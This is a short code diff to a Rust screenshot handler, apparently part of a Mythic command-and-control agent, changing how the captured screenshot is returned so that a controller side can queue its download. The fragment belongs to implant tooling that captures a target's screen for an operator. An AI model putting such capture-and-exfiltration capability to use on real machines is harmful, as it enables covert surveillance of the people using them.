@@ -37,9 +37,9 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     let args = ScreenshotArgs {};
     match execute_screenshot(args, &task.id) {
         Ok(output) => {
-            // For screenshot, we need to return the special format that triggers automatic download
-            // The overlay server will detect the "screenshot_captured:" prefix and create a download task
-            Ok(mythic_success!(task.id, output))
+            // For screenshot, we need to return the raw string format that the Python side expects
+            // The Python side will detect the "screenshot_captured:" prefix and create a download task
+            Ok(serde_json::Value::String(output))
         },
         Err(error) => {
             Ok(mythic_error!(task.id, format!("Screenshot failed: {}", error)))
